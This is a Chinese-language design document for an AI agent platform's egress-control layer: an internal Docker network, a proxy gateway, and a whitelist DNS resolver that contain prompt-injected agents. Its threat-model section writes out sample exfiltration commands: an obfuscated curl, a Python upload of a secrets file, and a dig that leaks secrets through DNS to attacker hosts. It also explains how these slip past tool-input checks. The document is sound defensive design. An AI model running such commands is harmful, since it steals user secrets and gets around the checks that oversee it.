# Egress 控制架构

本文档介绍 RoleMesh 的 Egress Control 模块——在 Container Hardening 和 Safety Framework 之上，通过**网络层物理隔离 + 受控 Gateway + 受控 DNS resolver** 把 agent 容器的所有出站流量收口的设计。

它涵盖为什么仅靠 Safety Framework 的 tool-input 层 URL 检查不够、为什么必须在网络层做 deny-by-default、为什么 DNS resolver 是必备的而非可选的、与现有 `credential_proxy` 的搬迁关系，以及 V1 故意没做的事。

目标读者：负责实现 Egress Control 的开发者；将来扩展 egress 规则、引入 TLS intercept、迁移 Gateway 到 Firecracker / Kata 的开发者；或思考"为什么 agent 还能访问外网"的运维。前置阅读：[`13-safety-overview.md`](13-safety-overview.md) §2.2、[`14-container-hardening-architecture.md`](14-container-hardening-architecture.md)、[`15-safety-framework-architecture.md`](15-safety-framework-architecture.md)。

> **状态**：本文档描述 V1 设计，**尚未实现**。Container Hardening 和 Safety Framework V1 已合并，是 Egress Control 的前置依赖。

---

## 背景：剩余风险

Container Hardening 关了"容器逃逸"，Safety Framework V1 关了"基于可观测 tool 事件的恶意输入"。但 agent 容器仍然可以：

1. 用 `Bash + curl` 任意发 HTTP 请求到任意 IP / 域名
2. 用 `python -c "urllib.request.urlopen(...)"` 绕过任何 tool 层检测
3. 用 `dig $secret.attacker.com` 通过 DNS 查询泄漏数据（DNS exfiltration——业界最常见的 agent 数据外泄手法）
4. 直连内网段（除已被 metadata blackhole 的 IP）

Safety Framework V2 设计中的 `domain_allowlist` check 在 tool input 层扫描 URL，但有三条结构性绕过路径：

**路径 1：Bash 工具变形**
```
Bash(command="curl $(echo aHR0cHM6Ly9ldmlsLmNvbQ== | base64 -d)")
```
要在 tool_input 里识别 URL，需要 shell parser + 变量解析 + 编码识别——永远追不上攻击者的变形能力。

**路径 2：Write + Exec**
```
Step 1: Write(/tmp/x.py, "import urllib.request; urlopen('https://evil.com', data=open('/workspace/secrets').read())")
Step 2: Bash("python /tmp/x.py")
```
两步分开，每一步的 tool input 看起来都人畜无害。

**路径 3：DNS exfiltration**
```
Bash("dig $(base64 /workspace/secrets | head -c 63).attacker-dns.com")
```
根本不是 HTTP，没经过任何 HTTP proxy 也没在 tool input 里出现 URL 字段。

这三条都是**真实的、已被业界 demo 过的攻击形态**（Simon Willison、Invariant Labs 多篇博客）。要堵住它们，必须把控制点从"应用层"下沉到"**网络层 + DNS 层**"——agent 不管怎么变形，包一发出容器就由我方控制。

---

## 设计目标

1. **网络层 deny-by-default。** Agent 容器**物理上**没有到外网的路由——不是依赖应用层"请不要访问"，而是 OS 内核层面就不通。
2. **受控 DNS resolver。** Agent 容器的 DNS 查询只能解析白名单内的域名，关闭 DNS exfiltration 通道。
3. **复用 Safety Framework 的策略层。** 域名白名单是 `safety_rules` 表里的一行，不新建表、不新建 REST 路由——白嫖 Safety 已有的 audit / 多租户 / 热更新 / pydantic 校验全套基础设施。
4. **保留现有 LLM 凭证注入语义。** Anthropic / OpenAI 等 LLM endpoint 继续通过反向代理注入凭证，agent 不感知。
5. **Fail-closed by default。** Gateway 不可用 = agent 全部出站失败（不允许静默降级放行）。
6. **跨平台一致。** Linux 原生 Docker / macOS Docker Desktop / Windows WSL 行为一致；不依赖只有某一种环境才有的特性。
7. **零业务行为改变。** 已配置好白名单的 agent 工作流完全不感知 Gateway 存在；只在违规时才返回 403。

---

## 已考虑的备选方案

### 方案 A——只靠 Safety Framework 的 tool-input domain allowlist

完全在应用层做防御，不动网络层。

**优点**：实现简单，无网络拓扑改动。

**缺点**：上述三条结构性绕过路径全部敞开——agent 一旦被 prompt injection 攻陷，"防 exfiltration" 三个字名存实亡。Safety Framework 的 `domain_allowlist` 是"防意外、防初级 prompt injection"，不是"防对抗性攻击"。

**否决**——违背 [`13-safety-overview.md`](13-safety-overview.md) §5.2 "assume prompt injection will succeed" 原则。

### 方案 B——在 agent 容器内跑 iptables / nftables

经典做法：容器启动后在容器内写 iptables 规则 DROP 除 proxy 外的所有 egress。

**优点**：每个容器自己管自己，无需 Docker network 模型改动。

**缺点**：要往内核 netfilter 写规则需要 `CAP_NET_ADMIN` capability。Container Hardening 明确 `CapDrop=ALL`（[`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) R3），不能为了 Egress 而打开这个洞——`NET_ADMIN` 还能改 ARP、关闭网卡、做各种容器内攻击。

**否决**——与已立项的容器加固方向冲突。

### 方案 C——Docker `--internal` network + DMZ Gateway（选中）

把 `rolemesh-agent-net` 改成 `--internal`（Docker 原生能力：dockerd 启动时不给该 network 添加默认路由）。Gateway 容器同时挂 `rolemesh-agent-net` 和新增的 `rolemesh-egress-net`（普通 bridge，有外网），形成 bastion / DMZ 模式：Gateway 是 agent 唯一的出口。

**优点**：
- `--internal` 是 Docker 原生能力——iptables 规则由 dockerd 自动管理，运维零负担
- 容器内**完全不需要任何 capability**——隔离效果由宿主层强制
- 跨平台一致（Docker 在所有 OS 上行为一致）
- 即使 agent 完全被 compromise，**也没有任何到互联网的路由**——从 kernel 层面断开

**缺点**：
- credential_proxy 当前跑在宿主上，agent 通过 `host.docker.internal` 访问——切到 `--internal` 后这条路不通，必须把 credential_proxy **容器化**到 `rolemesh-agent-net` + `rolemesh-egress-net` 双网卡上
- 新增一个网络管理职责

**选中**——这是本文档其余部分描述的形态。

### 方案 D——Firecracker microVM 完全隔离

每个 agent 跑在独立 microVM 里。

**优点**：硬件级隔离。

**缺点**：与 [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) 方案 B 否决理由一致——重写容器编排层，V1 不做。

**否决（V1）**——长期 V2+ 候选。

---

## 七层防御模型与本模块覆盖

业界讨论 egress 控制时常用一个"七层防御"模型，本模块在 V1 阶段的覆盖情况：

| 层 | 内容 | V1 覆盖 |
|---|---|---|
| L1 网络层 deny-by-default | 容器默认无外网路由 | ✅ 完整（Docker `--internal`） |
| L2 DNS 控制 | 受控 resolver + 域名白名单 + blackhole metadata | ✅ 完整（受控 DNS resolver） |
| L3 URL / HTTP 方法控制 | 解 HTTPS 看 URL path / method | ⚠️ 部分（反向代理可见 path；CONNECT 模式只到域名级；TLS intercept 推 V2） |
| L4 Header 控制 | 剥离敏感 header | ⚠️ 部分（沿用 credential_proxy 现有 hop-by-hop 剥离） |
| L5 Body 扫描（secret / PII） | 出站请求体内容检查 | ❌ V2 |
| L6 流量配额 | 大小上限 / rate limit | ❌ 明确不做（用户决策） |
| L7 响应入向检查 | 下载内容扫描 | ❌ V2 |

V1 的边界是**"把数据外泄通道关上"——L1 + L2 完整 + L3/L4 反向代理部分**。L5/L7 是"细化检测"，留 V2 与 Safety Framework 的内容扫描 check 整合时一起做；L6 与 Safety Framework rate_limit 解耦，独立任务。

---

## 三层架构

```
┌─────────────────────────────────────────────────────────┐
│  Application Layer                                       │
│   Safety Framework PRE_TOOL_CALL checks (V2)             │
│   ── 拦截"诚实"的 tool input 里的 URL，防意外             │
├─────────────────────────────────────────────────────────┤
│  Gateway Layer (EC-2 + EC-3)                             │
│   * 正向代理 (HTTP CONNECT) — SNI / CONNECT host 级        │
│   * 反向代理 — 凭证注入 (现状) + 域名白名单                  │
│   * 受控 DNS resolver — 关闭 DNS exfil                    │
│   * EGRESS_REQUEST stage check 入口                       │
│   * 审计写 safety_decisions                                │
├─────────────────────────────────────────────────────────┤
│  Network Layer (EC-1)                                    │
│   * rolemesh-agent-net 改 --internal — 物理无外网路由      │
│   * 新 rolemesh-egress-net — Gateway 出方向                │
│   * Gateway 容器化，同时挂两张网卡 (DMZ 模式)               │
│   * agent 的 Dns 直接指向 Gateway IP                       │
└─────────────────────────────────────────────────────────┘
```

### 网络拓扑

```
┌── 宿主机 ────────────────────────────────────────────────┐
│                                                          │
│  ┌── rolemesh-agent-net (bridge, --internal) ────────┐  │
│  │  no default route to outside                       │  │
│  │                                                    │  │
│  │   agent-coworker-A   agent-coworker-B   ...        │  │
│  │   ICC=false 容器间互通禁用                          │  │
│  │   Dns: <egress-gateway 在该 net 的 IP>             │  │
│  │   HTTPS_PROXY: http://egress-gateway:3128          │  │
│  │                          │                         │  │
│  │                          ▼                         │  │
│  │   ┌──── egress-gateway (容器, 双网卡) ───┐         │  │
│  │   │  port 53/udp   - DNS resolver        │         │  │
│  │   │  port 3001/tcp - 反向代理 (凭证注入)  │         │  │
│  │   │  port 3128/tcp - 正向代理 (CONNECT)  │         │  │
│  │   └──────────────────────────────────────┘         │  │
│  └────────────────────────────│───────────────────────┘  │
│                               │                          │
│  ┌── rolemesh-egress-net (bridge) ────────────────────┐ │
│  │   普通 bridge, 有默认路由                          │ │
│  └──────────────────│─────────────────────────────────┘ │
│                     ▼                                    │
│                  互联网                                  │
└──────────────────────────────────────────────────────────┘
```

### 请求路径

**反向代理（LLM 凭证注入，保留行为）**：
```
agent → http://egress-gateway:3001/anthropic/v1/messages
      ↓ Gateway 提取域名 api.anthropic.com
      ↓ Safety pipeline (EGRESS_REQUEST stage)
      ↓ allow → 注入 ANTHROPIC_API_KEY → HTTPS 转发到 api.anthropic.com
      → 响应原路返回
```

**正向代理（任意出站）**：
```
agent 容器 env: HTTPS_PROXY=http://egress-gateway:3128
agent 发 https://github.com/...
  ↓ TCP 连 egress-gateway:3128
  ↓ 发 CONNECT github.com:443 HTTP/1.1
  ↓ Gateway: Safety pipeline (EGRESS_REQUEST, host=github.com)
  ↓ allow → 200 Connection Established → 建立 TCP 隧道
  ↓ agent ↔ github.com 端到端 TLS (Gateway 不解密)
```

**DNS 路径**（平台级策略 — 见下文"DNS 面：平台级策略"）：
```
agent: dig metrics.corp.example      # 在 EGRESS_DNS_ALLOWLIST 中
  ↓ UDP 53 → Gateway 内 DNS resolver
  ↓ 平台白名单命中（无身份判定，对所有租户一致）
  ↓ allow → 递归向上游查询 → 返回 A 记录

agent: dig evil.com
  ↓ UDP 53 → Gateway 内 DNS resolver
  ↓ 平台白名单未命中 → block
  ↓ 返回 NXDOMAIN, 不向上游查询
  ↓ ★ 攻击者控制的 DNS 完全收不到任何信号
```

### DNS 面：平台级策略（非按租户）

DNS resolver 最初通过源 IP 身份映射复用按租户的 `egress.domain_rule`
规则行。这层耦合已退役：DNS 决策现在来自一份平台级全局白名单
（`EGRESS_DNS_ALLOWLIST`，默认**空表**），配合 `EGRESS_DNS_MODE`：
`enforce`（默认）或 `observe`（全部放行、记录本应拦截的查询；仅作迁移
观察用）。

为什么平台级足够 — 以及为什么这份列表保持空：

- 经代理的流量从不在 agent 容器内解析目标域名。设置了 `HTTP_PROXY`
  后，SDK 把域名作为字符串交给 gateway（CONNECT 请求行 / 绝对形式
  URL），由 **gateway** 在自己的出口侧解析链路上解析——本策略不约束
  那条链路。按租户的访问控制在 CONNECT / reverse proxy 层，原样保留。
- 容器名（`nats`、`egress-gateway`）由 Docker 内嵌 DNS（127.0.0.11）
  本地应答；只有外部域名会被转发到 gateway resolver。
- 因此到达本 resolver 的每个查询都来自绕开代理约定的代码——要么是
  未配置代理的工具，要么是 DNS 渗出攻击。在这里放行任何域名都救不了
  任何合法流程（网桥没有到解析结果的路由）；这个 resolver 是**绊网**
  而不是服务。修复不认代理的工具，而不是放宽这份列表。
- 租户自助配置绝不能触达这份列表：否则恶意租户把自己控制的域名加入
  白名单，等于给**所有**租户的被攻陷 agent 开了一条 DNS 渗出通道。
  列表由运维设置（env），将来若确需运行时编辑，升级路径是
  `platform_safety_rules`。

审计影响：DNS 决策记录为 gateway 结构化日志（qname 在注册域之外
脱敏），不再写 `safety_decisions` 行——平台级决策不携带审计 fan-in
做 coworker 复验所需的 per-agent 身份。HTTP 面保留完整的按租户审计
归因；一次 DNS 渗出尝试几乎总是伴随一条可归因的 CONNECT 拦截记录。

### HTTP 面身份：签名 token（而非源 IP）

forward / reverse proxy 最初通过把 agent 的网桥 IP 经 NATS
`orchestrator.agent.lifecycle` 事件喂养的内存表反查来获取身份。该方案
正被**无状态签名 token**（`egress/token_identity.py`）替代：

- orchestrator 在每次 spawn 时签发一个 HMAC-SHA256 token，携带完整身份
  （tenant / coworker / user / conversation / job）加过期时间，注入 agent
  的代理 env——放在 forward proxy URL 的 userinfo
  （`HTTP_PROXY=http://job:<token>@gateway`，客户端自动发
  `Proxy-Authorization: Basic`）以及每个 reverse proxy base URL 的前导
  路径段（`/proxy/<token>/<provider>`）。
- gateway 用共享的 `EGRESS_TOKEN_SECRET` 验签并直接读出身份——无共享
  状态、无事件流、无查找表，验证是纯函数。

动机：IP 方案把身份与 L3 拓扑绑死（NAT / k8s / 多机下失效），且依赖一条
分布式状态管道，其每种失败模式都是静默 401（丢一条 lifecycle 事件 →
该 agent 在 gateway 下次重启前永久 401）。token 随请求同行，容器一启动
身份即成立，gateway 重启零恢复。

TTL 与回收：token 是 bearer 凭证，受 `EGRESS_TOKEN_TTL_SECONDS`（默认
7 天）约束。由于会话容器可能超过任何固定窗口，orchestrator 在消息边界
于 token 到期前回收容器来重新签发——过期永不落在对话中途，gateway 保持
无状态验证者。密钥只存在于 orchestrator 和 gateway（共享 `.env`），绝不
进入 agent 容器。

身份只来自 token：gateway 仅从验签通过的 token 读取身份（reverse proxy
的前导路径段，或 forward proxy 的 `Proxy-Authorization`），不再有源 IP
回退——缺失/无效 token 的请求没有身份，直接拒绝。（这取代了此前的双跑
窗口，期间 gateway 还会查 NATS 喂养的源 IP 映射；待 token 覆盖率达 100%
且 token 与 IP 零不一致后，那条管道——lifecycle 事件、identity 快照
RPC、内存 IP→身份表——已整体删除。）

客户端坑——代理认证方式：客户端必须在 `Proxy-Authorization` 头里**主动**
出示 token。多数客户端如此（curl/httpx/requests/urllib/undici 都从代理
URL 的 userinfo 发 Basic），但 **git** 默认 `http.proxyAuthMethod=anyauth`，
要等代理回 `407` 质询后才发凭据。因此 agent 镜像固定了
`git config --system http.proxyAuthMethod basic`，让 git 主动发 token。
日后新增的任何 anyauth 客户端需同样处理。

`407` 质询：forward proxy 对缺失/无效 token 的 CONNECT（或 plain HTTP）
回 `407 Proxy Authentication Required` 带 `Proxy-Authenticate: Basic`，
**而非** `403`，让等质询才发凭据的 anyauth 客户端能补发重试；完全无 token
的客户端则直接 fail-closed。407 后关闭连接（`Connection: close`），重试
客户端会新开连接重发带 token 的 CONNECT，因此无需连接保活状态机。reverse
proxy 对同样情形回 `401`（它是上游服务器而非代理，401 语义正确）。

---

## 三个独立 PR（EC-1 / EC-2 / EC-3）

按"从底层网络往上"组织。**严禁并行**——上层依赖下层的连通性验证才能 merge。

### EC-1：网络层强制

**做什么**：
- `rolemesh-agent-net` 改 `--internal`
- 新增 `rolemesh-egress-net`
- credential_proxy 容器化（基础骨架，无新功能），同时挂双网卡
- agent 容器去掉 `host.docker.internal` ExtraHost，新增 `HTTP_PROXY / HTTPS_PROXY / NO_PROXY` env，`Dns` 字段切到 Gateway IP
- orchestrator 启动顺序更新 + 新连通性自检 `verify_egress_gateway_reachable`

**Merge 闸口**：Linux 原生 Docker 上四项集成测试全过：
1. 容器内 `socket.connect('1.1.1.1', 443)` timeout（**核心防御**）
2. metadata `169.254.169.254` 不可达
3. `http://egress-gateway:3001/healthz` 200
4. `HTTPS_PROXY` env 已注入

第 1 项不通过 = EC-1 整体无意义。

### EC-2：Gateway 功能升级

**做什么**：
- 正向代理 (HTTP CONNECT) — `src/rolemesh/egress/forward_proxy.py`
- 反向代理业务从 `credential_proxy.py` 搬到 `src/rolemesh/egress/reverse_proxy.py`（`credential_proxy.py` 退化为薄包装，保留 public API）
- 受控 DNS resolver — `src/rolemesh/egress/dns_resolver.py`（dnslib 实现，禁 TXT/ANY/SRV 防 DNS tunnel）
- 身份 — 从每请求的签名 token 恢复（`token_identity.py`）；见上文"HTTP 面身份：签名 token"。（最初是 NATS 喂养的源 IP→身份映射，已被 token 取代。）
- Rule 缓存 — 启动时全量 load + NATS `safety.rule.changed` 增量失效
- 轻量 pipeline — `src/rolemesh/egress/safety_call.py`（Gateway 内调 Safety Check + 写 audit）

**Merge 闸口**：
- CONNECT 命中白名单 → 200 + 隧道；未命中 → 403
- DNS 白名单内 → 真 IP；外 → NXDOMAIN（不调上游）
- DNS qtype=TXT → REFUSED
- `safety_decisions` 表有对应审计行

### EC-3：Safety Framework 集成

**做什么**：
- `src/rolemesh/safety/types.py` 的 Stage 枚举新增 `EGRESS_REQUEST`
- pipeline `_CONTROL_STAGES` 加入 `EGRESS_REQUEST`
- 新 Check：`src/rolemesh/safety/checks/egress_domain_rule.py`（严格仿 `pii_regex.py` 结构）
- 注册到 orchestrator registry（容器侧不注册）
- REST 端点零改动——`/api/admin/tenants/{tid}/safety/rules` 直接支持 `stage='egress_request'`
- NATS publish `safety.rule.changed`（REST CRUD 后）

**Merge 闸口**：完整 E2E 剧本：管理员配规则 → agent 触发 → 命中 / 未命中行为正确 → 审计有 4 条记录（HTTP allow + HTTP block + DNS allow + DNS block）→ 热更新生效（PATCH 规则 disable → 等 NATS 传播 → 下次请求被 block）。

---

## 与现有 credential_proxy 的关系

`credential_proxy.py` (353 LoC) 当前跑在宿主上，agent 通过 `host.docker.internal:3001` 访问，做反向代理凭证注入。EC 后：

- **业务逻辑**搬到 `src/rolemesh/egress/reverse_proxy.py`
- `credential_proxy.py` 保留薄包装，**所有 public API（`start_credential_proxy / register_mcp_server / set_token_vault` 等）路径不变**——外部 import 零改动
- Gateway 进程容器化，监听同样的 3001 端口（在 Gateway 容器内）
- agent 访问改为 `http://egress-gateway:3001/...`（Docker 内置 DNS 解析容器名）

**搬迁，不重写**——业务逻辑（凭证选择、provider 注册、token vault）保持原样。

---

## 与 Safety Framework 的关系

EC 模块**完全复用** Safety Framework 已有的基础设施，**不新建**：

| 复用 | 不新建 |
|---|---|
| `safety_rules` 表（egress rule = stage='egress_request' 的行） | `egress_policies` 表 |
| `safety_decisions` 表（egress 审计走同表） | `egress_decisions` 表 |
| `/api/admin/tenants/{tid}/safety/rules` REST CRUD | `/api/admin/.../egress/policies` |
| `safety_rules_audit` 触发器（规则变更时间线） | 独立审计 |
| Pydantic `config_model` 校验 | 自实现校验 |
| 多租户 + coworker scope | 重新实现 |

唯一新增：
- Stage 枚举新增 `EGRESS_REQUEST`
- 新 Check 类 `EgressDomainRuleCheck`
- Gateway 内的轻量 pipeline（V1 只跑一个 check，比 agent_runner 的 pipeline 简化）

这种**最大化复用**的设计避免：
- 两套 admin 界面 / 文档 / 学习曲线
- 两套审计来源 / 报表 / 权限模型
- 两份多租户隔离逻辑

代价是 EC 的设计**深度绑定** Safety Framework V1 形态——后者重大重构会带动前者。这是有意识接受的取舍。

---

## 取舍与边界

### 接受的取舍

- **Gateway 是单点故障**：Gateway 挂 = 全租户出站失败。V1 通过 restart-unless-stopped + 监控告警缓解；V2 做 double-replica。
- **DNS 走自实现 resolver**：引入 dnslib 依赖；不复用 dnsmasq 是因为 dnsmasq 没有"按 tenant 鉴权"能力，自实现更简单。
- **SNI 级而非 URL 级**：HTTPS 不解密——`*.github.com` 一刀切，无法做 "允许读不允许写"。TLS intercept 推 V2，且只对显式标记的域名开启。
- **Rule 缓存可能短暂陈旧**：NATS rule.changed 事件丢失时，cache 失效会延迟到下次后台对账（5 分钟）。

### 明确不做（V1 范围之外）

- **请求 / 响应大小上限**——独立任务，与 Safety Framework rate_limit 一起评估
- **Rate limit / quota**——同上
- **TLS intercept（解 HTTPS 看 URL/body）**——V2
- **Body 内容扫描（secret/PII）**——V2，复用 Safety Framework 的 secret_scanner
- **响应入向检查**——V2
- **Header 白名单**——沿用 credential_proxy 现有 hop-by-hop 剥离即可
- **Gateway HA / 多副本**——V2
- **Admin UI 页面**——复用 Safety Framework 的 rules 页（filter stage=egress_request）
- **gVisor 适配 Gateway 容器**——后续优化
- **DoH / DoT**——V3
- **IPv6**——所有 network 只配 IPv4

---

## 风险与回滚

| 风险 | 严重度 | 缓解 |
|---|---|---|
| Gateway 挂 = 全租户断网 | 高 | restart-unless-stopped + 监控；V2 double-replica |
| Identity 信息丢失（orchestrator 重启） | 中 | Gateway 重启时通过 internal REST 拉快照；orchestrator 重启时主动 republish lifecycle |
| `safety.rule.changed` 事件丢失 | 低 | Gateway 后台每 5 分钟对账（拉全量做对比） |
| DNS resolver 上游不可达 | 中 | 配多个 upstream（8.8.8.8 + 1.1.1.1 fallback） |
| Docker `--internal` 在某 dockerd 版本行为异常 | 高 | EC-1 集成测试第 1 项必过；CI 守护 |
| reverse_proxy 搬迁破坏现有 LLM 调用 | 高 | 严格保持 `credential_proxy.py` public API；测试覆盖所有 provider |

回滚开关：`CONTAINER_NETWORK_NAME=""` → orchestrator 不创建任何网络（agent 用默认 bridge），完全退到 Container Hardening 之前的行为。**仅紧急用**。

---

## 一句话总结

**Egress Control 通过 "Docker `--internal` 物理切断外网路由 + 容器化 Gateway + 受控 DNS resolver" 三件事，把 agent 容器的所有出站（HTTP/HTTPS/DNS）收口到一个声明式可控的 Gateway**。

它**不重写** credential_proxy 的业务逻辑（搬迁不重写），**不新建** policy 表（复用 Safety Framework 的 `safety_rules`），**不引入** 应用层信任假设（防的就是 prompt injection 攻陷后的对抗性 agent）。

V1 覆盖七层防御模型的 L1/L2 + 部分 L3/L4，关闭 DNS exfil 通道——这是当前 RoleMesh 防御纵深里**最后一个结构性漏洞**。完成后，"compromised agent 出不去才是真安全" 这句话才真正成立。
